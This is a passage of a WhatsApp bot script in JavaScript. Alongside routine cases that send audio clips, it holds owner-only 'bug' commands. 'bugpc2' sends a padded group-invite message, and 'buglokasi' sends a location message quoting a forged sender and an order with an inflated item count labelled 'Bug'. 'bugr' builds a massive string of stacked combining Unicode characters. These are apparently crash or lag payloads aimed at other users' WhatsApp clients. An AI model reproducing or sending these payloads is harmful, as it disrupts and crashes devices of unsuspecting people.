         const sound28 = fs.readFileSync('audio/sound28.mp3')
         zoe.sendMessage(from, sound28, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound29':
         const sound29 = fs.readFileSync('audio/sound29.mp3')
         zoe.sendMessage(from, sound29, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound30':
         const sound30 = fs.readFileSync('audio/sound30.mp3')
         zoe.sendMessage(from, sound30, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'bugpc2':
					if (!dev.key.fromMe) return reply(mess.owner)
buf = fs.readFileSync('./database/media/gambar.jpg')
imeu = await zoe.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
jk = await zoe.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "6288224859350-1624969639@g.us",
"inviteCode": "h+64P9RhJDzgXSPf",
"inviteExpiration": "1625338378",
"groupName": `zoe                                  ${vapi}`,
"jpegThumbnail": fs.readFileSync('./database/pirtek/zextz.jpg')
}
}, {quoted:imeu, contextInfo:{}})
zoe.relayWAMessage(jk)
await setTimeout(() => {
reply('zoe     ')
}, 3000)
break
         case 'sound31':
         const sound31 = fs.readFileSync('audio/sound31.mp3')
         zoe.sendMessage(from, sound31, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
case 'buglokasi':
if (!dev.key.fromMe && !isOwner) return
zoe.updatePresence(from, Presence.composing)
		       zoe.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${namaowner}`,
						address: `${namabot}`,
                        jpegThumbnail: reply },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${namaowner}`,
    orderTitle: `${namabot}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'bugr':
if (!dev.key.fromMe && !isOwner) return
             await zoe.toggleDisappearingMessages(from)
wew = fs.readFileSync(`./src/logo1.jpg`)
lzain = `
*999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭999999**ผ
ิดุท้่เึางืผิดุท้่เึางื**9999999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicX
bot*৭৭৭৭৭৭৭৭*MythicXbot*๒๒๒๒๒๒๒๒*MythicXb
ot*৭৭৭৭৭৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicX
bot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์